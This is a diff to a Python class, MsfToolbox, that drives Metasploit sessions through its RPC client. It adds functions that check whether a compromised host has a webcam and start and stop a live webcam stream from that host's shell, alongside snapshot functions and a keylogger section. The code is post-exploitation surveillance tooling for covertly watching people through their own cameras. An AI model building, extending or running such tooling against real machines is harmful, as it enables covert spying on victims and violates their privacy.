@@ -35,6 +35,9 @@ class MsfToolbox:
 		# Init remote to false
 		self.disable_remote()
 
+		# Live stream if off at the beginning
+		self._streaming = False
+
 
 	def init_client(self):
 		self._client = MsfRpcClient(self._password, port=self._port)
@@ -153,6 +156,10 @@ class MsfToolbox:
 
 
 	# Webcam snapshots
+	def has_webcam(self, session):
+		shell = self.get_session_shell(session)
+		webcam.has_webcam(shell)
+
 	def post_take_snapshot(self, session):
 		shell = self.get_session_shell(session)
 		snapshot_path = media.get_media_path(session, "snapshots")
@@ -169,19 +176,41 @@ class MsfToolbox:
 	def start_live(self, session):
 		media.remove_live_path()
 
+		shell = self.get_session_shell(session)
+		live_path = media.get_live_path()
+		webcam.start_live(shell, live_path)
+		self.enable_streaming_flag()
+
 
 	def stop_live(self, session):
+		shell = self.get_session_shell(session)
+		webcam.stop_live(shell)
+		self.disable_streaming_flag()
 		media.remove_live_path()
 
 
 	def live_update_frame(self, session):
-		shell = self.get_session_shell(session)
-		live_path = media.get_live_path()
-		webcam.post_take_snapshot(shell, live_path)
+		#shell = self.get_session_shell(session)
+		#live_path = media.get_live_path()
+		#webcam.post_take_snapshot(shell, live_path)
+		pass
 
 
 	def get_live_url(self):
 		return media.get_live_url()
+
+
+	def enable_streaming_flag(self):
+		self._streaming = True
+
+
+	def disable_streaming_flag(self):
+		self._streaming = False
+
+
+	def get_streaming_flag(self):
+		return self._streaming
+
 
 
 	# Keylogger
